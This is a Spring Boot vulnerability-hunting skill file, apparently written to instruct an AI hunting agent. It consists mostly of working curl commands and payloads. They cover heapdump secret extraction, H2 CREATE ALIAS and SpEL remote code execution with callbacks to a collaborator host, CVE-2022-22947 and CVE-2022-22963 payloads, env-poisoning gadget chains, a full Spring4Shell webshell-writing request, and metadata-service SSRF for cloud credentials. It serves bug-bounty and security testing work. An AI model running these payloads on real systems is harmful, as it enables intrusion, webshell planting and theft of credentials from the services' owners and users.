# Upstream source: springboot (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/springboot/SKILL.md`

---

---
name: springboot
description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
---

# HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities

## Crown Jewel Targets

Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.

**Highest-value findings:**
- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding

---

## Phase 1 — Fingerprint Spring Boot

```bash
# Spring Boot indicators
curl -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"

# Actuator root (may list available endpoints)
curl -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null

# Try common base paths
for base in "" "/manage" "/management" "/app"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
done
```

---

## Phase 2 — Actuator Endpoint Enumeration

```bash
BASE="https://$TARGET/actuator"

# High-impact endpoints
ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
           "loggers" "info" "health" "configprops" "shutdown" "trace"
           "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
           "flyway" "liquibase" "refresh" "restart")

for EP in "${ENDPOINTS[@]}"; do
  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
  # page for many paths. Require actuator-shaped JSON (or a heapdump body)
  # before calling it EXPOSED.
  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
  if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
    echo "[+] EXPOSED: $BASE/$EP"
  fi
done

# Get environment variables (passwords, API keys)
curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20

# Get all endpoint mappings (full API surface)
curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort

# Get Spring beans (lists all registered beans, reveals internal architecture)
curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
```

---

## Phase 3 — Heap Dump Analysis

```bash
# Download heap dump (can be large — 100MB+)
curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
ls -lh /tmp/heapdump.hprof

# Quick grep for secrets in heap dump (binary file — use strings)
strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
  grep -v "^[a-z_]" | sort -u | head -50

# More targeted extraction
strings /tmp/heapdump.hprof | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
strings /tmp/heapdump.hprof | grep -oP "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
strings /tmp/heapdump.hprof | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens

# Use Eclipse Memory Analyzer (MAT) for deep analysis
# https://www.eclipse.org/mat/
```

---

## Phase 4 — H2 Console RCE

```bash
# H2 console detection
curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
curl -s "https://$TARGET/h2" | grep -i "H2 Console"
curl -s "https://$TARGET/console" | grep -i "H2"

# Default credentials: sa / (empty password)
# JDBC URL: jdbc:h2:mem:testdb

# If accessible, RCE via CREATE ALIAS:
# SQL to execute:
# CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
#   Runtime rt = Runtime.getRuntime();
#   String[] commands = {"sh","-c",cmd};
#   Process proc = rt.exec(commands);
#   return new String(proc.getInputStream().readAllBytes());
# } $$;
# CALL EXEC('id');
```

---

## Phase 5 — SpEL Injection

```bash
# Spring Expression Language injection in user-controlled fields
# Test: ${7*7} or #{7*7} → if the response reflects 49, SpEL is being evaluated

# Common injection points:
# - Email template fields: "Hello ${name}"
# - Custom annotation @Value("${user.input}")
# - Spring Security expressions
# - Spring WebFlow

# Basic SpEL test
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{7*7}"}'
# If returns 49 → SpEL injection confirmed

# RCE payload — note: exec() returns a Process, not a String, so a bare
# exec("id") produces NO visible output. Confirm via an OOB curl callback
# (the spawned curl makes the network request even though nothing is reflected):
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'

# CVE-2022-22963 — Spring Cloud Function SpEL
curl -s -X POST "https://$TARGET/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
  -d "test"
```

---

## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
```bash
curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
 -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
```

## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
```bash
# logback JNDI:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
# Eureka XStream deserialization:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
curl -s -X POST "$BASE/actuator/refresh"
```
(Veracode: Exploiting Spring Boot Actuators.)

## Phase 6 — Spring4Shell (CVE-2022-22965)

```bash
# Affects: Spring Framework < 5.3.18 and < 5.2.20 (and all older branches);
# fixed in 5.3.18 / 5.2.20. Requires JDK 9+ and WAR-on-Tomcat deployment.
# Requires: Java 9+, Tomcat as WAR deployment

# Detection: does the app accept class.* parameters?
curl -s "https://$TARGET/api/user" \
  -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
# Check COLLAB for HTTP callback

# Exploitation: write webshell via class loader
curl -s "https://$TARGET/login" \
  --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

---

## Phase 7 — Jolokia JMX Exposure

```bash
# Jolokia provides HTTP access to JMX MBeans
curl -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
curl -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20

# List all MBeans
curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30

# Read system properties via Jolokia (may expose credentials)
curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
  python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"

# Exec MBean operations (potential RCE via MLet)
curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
```

---

## Chain Table

| Spring Boot finding | Chain to | Impact |
|--------------------|----------|--------|
| `/actuator/heapdump` | Extract DB passwords, API keys from memory | Critical credential exfil |
| `/actuator/env` | Read all env vars including secrets | High |
| H2 console accessible | CREATE ALIAS → RCE | Critical |
| SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
| Spring4Shell | Write webshell → RCE | Critical |
| Jolokia + MLet | Remote code via MBean | Critical RCE |

---

## Validation

✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
✅ Actuator/env: secrets visible in JSON response
✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
✅ H2 console: SQL executed, `id` output returned

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **Scale / likelihood (Wiz, Dec 2024):** ~**92,000** internet-facing Spring Boot Actuator endpoints; Actuator appears in ~60% of cloud environments, ~11% have a publicly exposed instance, and **24% of those exposed have a misconfigured instance**. GreyNoise saw ~1K malicious IPs scanning for Actuator in a 30-day window. This is not a rare finding — it is a mass-scanned surface.
- **Default exposure baseline:** since **1.5 (2017)** only `/health` and `/info` are exposed without auth. Anything else (`heapdump`, `env`, `gateway`, `mappings`, `beans`, `configprops`, `threaddump`, `scheduledtasks`, `loggers`, `shutdown`) is a deliberate config change and therefore a real finding when reachable. Wiz measured **2.3%** of exposed Actuators with an unauthenticated `heapdump` and **4%** with unauthenticated `env`.
- **2025–2026 CVEs to map against the version banner:**
  - **CVE-2025-41243** — Spring Cloud Gateway Server Webflux **Spring Environment property modification** via the actuator (F5/HeroDevs: EOL fix available); check `management.endpoint.gateway.enabled` / `access=unrestricted`.
  - **CVE-2025-41253** — SCG Webflux lets an untrusted actor create a route using **SpEL to read environment variables and system properties** when the `gateway` actuator is exposed (`management.endpoints.web.exposure.include=gateway`).
  - **CVE-2026-40976** — Spring Boot **authorization bypass** exposing actuator endpoints; fixed in **Spring Boot 4.0.6**. Verify unauth requests now return 401/403.
  - **CVE-2026-59284** — high-severity resource injection via the writable Spring Cloud Commons environment actuator endpoint.
  - **CVE-2025-48927** — TeleMessage exposed `/heapdump` at the root (not just `/actuator/heapdump`), exploited in the wild May 2025. Add bare `/heapdump`, `/env`, `/gateway/routes` to the path list.
  - **CVE-2022-22947** — SCG 3.1.0 / 3.0.0–3.0.6 and older: create a route with a SpEL filter, then `refresh` to trigger RCE. Wiz found ~28% of cloud environments using SCG had at least one vulnerable instance.
- **Spring Boot 4.0 nuance:** `/actuator/env` value redaction by the `Sanitizer` is the 4.0 default, but `/actuator/heapdump` is a full HPROF binary and is **not** sanitized — a "redacted env" response does not mean the heap is safe.
- **Fingerprints:** `X-Application-Context` header, Whitelabel Error Page, `/actuator` JSON, `spring-boot` favicon hash (Shodan `http.favicon.hash:116323821`), Java stack traces with `org.springframework` paths, `JSESSIONID`.
- **Alternate base paths to sweep:** `/manage/actuator`, `/management/actuator`, `/app/actuator` (already in the baseline Phase 1 loop) plus the bare `/heapdump`, `/env`, `/gateway/routes`, `/jolokia`, `/h2-console` roots used by older or reverse-proxied deployments. A path prefix in front of `/actuator` is the most common reason a scanner misses an exposed instance.
- **Cloud-context amplifier:** Wiz's graph analysis shows a misconfigured Actuator is graded far higher when the resource has a high-privilege attached role or the leaked keys grant broad cloud control. When triaging, follow the extracted AWS/GCP/Azure credential to its real permissions (cross-reference `cloud-iam-deep`) rather than stopping at "keys present in heap."
- **Health/info are not harmless:** `/actuator/health` can expose internal dependency endpoints and DB status; `/actuator/metrics` (Wiz example `http.client.requests`) leaked internal IPs and a "session" endpoint pattern. Grade these Low/Medium recon, not Critical.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Heap-dump credential mining (Wiz commands):**
```
curl 'https://TARGET/actuator/heapdump' -O          # also try bare /heapdump
strings heapdump | grep -B 2 -A 2 "AKIA"            # AWS keys
strings heapdump | grep -B 2 -A 2 "eyJ"             # JWTs
strings heapdump | grep -E "^Host:\s+\S+$" -C 10    # captured cookies / session tokens
```
  For deep analysis use Eclipse MAT (OQL) to find `java.lang.String` instances holding `password`, `secret`, `api_key`, private keys. A heap dump often yields more than `/env` because values are present pre-redaction.
- **Gateway SSRF-by-design (works even on patched versions):** `POST /actuator/gateway/routes/<name>` with a route whose `uri` points at `http://169.254.169.254`, then `POST /actuator/gateway/refresh`, then request the route. With IMDSv1 this returns AWS credentials; **IMDSv2 returns 401** — that 401 is a successful mitigation, not a failed SSRF.
- **CVE-2022-22947 RCE:** the route body's filter `args` are SpEL-injected; the **`/refresh` request is what triggers evaluation**. Use an OOB callback (`curl COLLAB_HOST/gw-rce`) rather than expecting command output. Confirm the route was created by reading `/actuator/gateway/routes` before refresh.
- **Writable `/env` → `/refresh` gadget chain:** POST `{"name":"logging.config","value":"http://COLLAB/logback.xml"}` (Logback JNDI) or `{"name":"eureka.client.serviceUrl.defaultZone","value":"http://COLLAB/x"}` (Eureka XStream deserialization), then POST `/actuator/refresh`. Watch for the callback; a 200 on `/env` alone proves property injection, not RCE.
- **Jolokia / MBeans:** `/jolokia/list` then `read java.lang:type=Runtime/SystemProperties` for secrets; `exec` on `com.sun.management:type=DiagnosticCommand` or the MLet MBean for code execution. `/actuator/jolokia` is the alternate path.
- **H2 console RCE:** `CREATE ALIAS EXEC AS $$ ... Runtime.getRuntime() ... $$; CALL EXEC('id');` — the alias body must return a String or no output is reflected.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Do not trust HTTP 200 alone.** Spring returns 200 with a Whitelabel/login page for many actuator paths. Require actuator-shaped JSON (`Content-Type: application/json`, keys like `_links`, `activeProfiles`, `propertySources`) or a genuine HPROF binary (`\x00\x00\x00\x0cJAVA PROFILE` header) before calling an endpoint EXPOSED.
- **Heap dump proof = extracted secrets**, not file size. Show the actual `AKIA...`, JWT, DB password, or captured `Cookie:` line (redacted in the report). A 100MB HPROF with no secrets is an exposure of internal state, not automatically a Critical credential disclosure.
- **Separate CVE from misconfiguration.** `/actuator/heapdump` reachable on a fully patched Spring Boot 3.x/4.x is still a High/Critical misconfiguration; CVE-2025-48927 is specifically the TeleMessage root-level `/heapdump` exploited in the wild. Do not label a generic misconfig as a CVE without a version match.
- **IMDS caveat:** a 401 on the gateway route to `169.254.169.254` means IMDSv2 is enforced — the SSRF primitive may still exist (test an internal service or Collaborator), but "AWS credentials leaked" would be false.
- **SpEL RCE proof:** use an OOB callback on a unique subdomain. `Runtime.exec()` returns a `Process`, not a String, so a bare `exec("id")` produces no reflected output — absence of output is not absence of execution.
- **Auth-bypass regression check (CVE-2026-40976):** re-test every actuator path unauthenticated after a patch is claimed; `/actuator/env` returning **redacted** values is expected in 4.0, but returning **any** non-`health`/`info` endpoint without 401/403 is still the finding.
- **Redact** all secrets, JWTs, session cookies, and cloud keys before attaching analyzer output or screenshots to a report; keep only masked prefixes and the affected property names.

### D. Sources — numbered list of URLs you actually fetched

1. https://www.wiz.io/blog/spring-boot-actuator-misconfigurations
2. https://spring.io/security/
3. https://nvd.nist.gov/vuln/detail/CVE-2025-41253
4. https://my.f5.com/manage/s/article/K000160223
5. https://www.herodevs.com/vulnerability-directory/cve-2025-41243
6. https://nvd.nist.gov/vuln/detail/CVE-2025-48927
7. https://www.sentinelone.com/vulnerability-database/cve-2026-40976/
8. https://www.eclipse.org/mat/
9. https://www.herodevs.com/vulnerability-directory/cve-2026-59284
10. https://www.trendmicro.com/en/research/26/c/from-misconfigured-spring-boot-actuator-to-sharepoint-exfiltrati.html
